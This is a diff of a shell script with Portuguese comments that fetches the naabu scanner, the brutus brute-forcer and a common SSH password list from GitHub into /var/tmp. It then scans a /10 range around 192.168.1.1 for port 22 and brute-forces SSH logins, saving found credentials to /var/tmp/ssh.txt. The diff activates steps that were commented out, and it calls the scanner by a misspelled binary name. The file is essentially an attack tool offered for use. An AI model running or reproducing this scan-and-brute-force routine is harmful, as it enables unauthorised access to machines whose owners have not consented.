@@ -5,38 +5,40 @@
 
 
 go_url='https://go.dev/dl/go1.26.5.linux-amd64.tar.gz'
-
 url_naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.tar.gz'
-
 url_brutus='https://github.com/praetorian-inc/brutus/releases/download/v1.10.0/brutus-linux-amd64.tar.gz' 
+creds='https://github.com/danielmiessler/SecLists/raw/refs/heads/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt'
 
 
 
 brute() {
 
-
 cd /var/tmp/naabu-2.6.1/cmd/naabu
 
 
 wget $url_brutus  -O   brutus || curl -L $url_brutus  -o  brutus #install brutus
- 
+wget $creds  -O  lista.txt   || curl -L  $creds  -o lista.txt  #list of pass  && users 
+
 tar -xf brutus
-  
+
 chmod  +x brutus 
 
-file brutus
 
-
-#timeout  5s     ./nabu  -p 22 -host 192.168.1.1/10  > ips     #120  segundos para  pega os ips
+timeout  10s     ./nabu  -p 22 -host 192.168.1.1/10  > ips_nabu     #120  segundos para  pega os ips
  
 
-#./brutus creds 
-
-
+./brutus creds   --targets-file  ips_nabu     -U  lista.txt   -P lista.txt   -q     >     /var/tmp/ssh.txt
 
 
 
 }
+
+
+
+
+
+
+
 
 
 
